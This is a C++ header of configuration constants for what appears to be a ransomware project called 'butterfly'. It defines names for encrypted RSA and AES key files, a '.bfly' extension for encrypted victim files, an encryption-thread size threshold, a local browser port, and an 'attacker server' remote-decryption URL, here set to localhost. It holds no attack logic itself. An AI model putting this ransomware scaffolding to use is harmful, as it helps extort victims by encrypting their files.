
#ifndef BUTTERFLY_BFLYPARAMS_H
#define BUTTERFLY_BFLYPARAMS_H

#include <string>

namespace butterfly
{

enum RSAKEY_TYPE { CPRIVATE_RSA, AESKEY };

namespace params
{

/************************************ Parameters for file handling ****************************************************/
// Filename CPrivateRSA.bin
const std::string ENC_CPRIVATERSA_FILENAME   = "CPrivateRSA.bin";                     // encrypted CPrivateRSA pem file
// Filename RSA.bin
const std::string RSA_EKIV_FILENAME          = "RSA.bin";                             // unencrypted RSAEK + RSAIV (1721/256Bytes + 16Bytes)
// Filename AES.bin
const std::string ENC_AESKEY_FILENAME        = "AES.bin";                             // encrypted AESKey+AESIV (32Bytes+16Bytes)
// Filename AES.bin.unencrypted
const std::string UNENC_AESKEY_FILENAME      = ENC_AESKEY_FILENAME + ".unencrypted";  // unencrypted AESKey+AESIV (32Bytes+16Bytes)


/************************************ Parameters for internal bfly actions ********************************************/
// Encrypted Butterfly File Extension
const std::string ENC_BFLY_FILE_ENDING       = ".bfly";                               // encrypted file extension
// If a file is greater than this value, new encryption thread is created
const double MAX_FILE_SIZE                   = 100.0;                                 // in MByte
// RSA Keysize for encryption
const int RSA_KEYSIZE                        = 2048;                                  // RSA Keysize
// Port for the HTTP Server
const int HTTP_SERVER_PORT                   = 8089;                                  // Browser Port
// Localhost URL for the Browser
const std::string LOCALHOST_URL              = "http://127.0.0.1";                    // Localhost URL


/************************************ Parameters for remote actions ***************************************************/
// Attacker Server Port for the remote decryption
const int REMOTE_DECRYPTION_URL_PORT         = 5000;                                  // Remote Port
// Attacker Server URL for the remote decryption
const std::string REMOTE_DECRYPTION_URL      = "http://localhost:" + std::to_string(REMOTE_DECRYPTION_URL_PORT) + "/decryption/";   // Remote URL

} // namespace params

} // namespace butterfly

#endif //BUTTERFLY_BFLYPARAMS_H
